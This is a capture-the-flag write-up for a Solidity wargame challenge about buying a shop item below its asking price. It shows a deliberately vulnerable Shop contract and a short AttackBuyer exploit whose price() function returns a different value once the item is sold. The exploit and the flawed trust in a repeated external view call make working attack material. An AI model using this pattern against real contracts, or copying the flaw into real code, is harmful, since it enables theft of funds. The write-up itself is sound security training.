## Challenge
~~~
Сan you get the item from the shop for less than the price asked?

##### Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```
`

## Solution

```
contract AttackBuyer {
    Shop shop = Shop(0x8448f7fF16785F60D48a83DFB3b0d911941745Aa);
    uint256 public timesCalled = 0;

    function price() external view returns (uint256){
        
        if(!shop.isSold()) {
            return 101;
        } else {
            return 1;
        }
    }

    function buy() external {
        shop.buy();
    }
}
```

Pretty similar to the Elevator challenge except the fact that the called function is `view` and thus cannot alter state.
## Key takeaways and useful resources



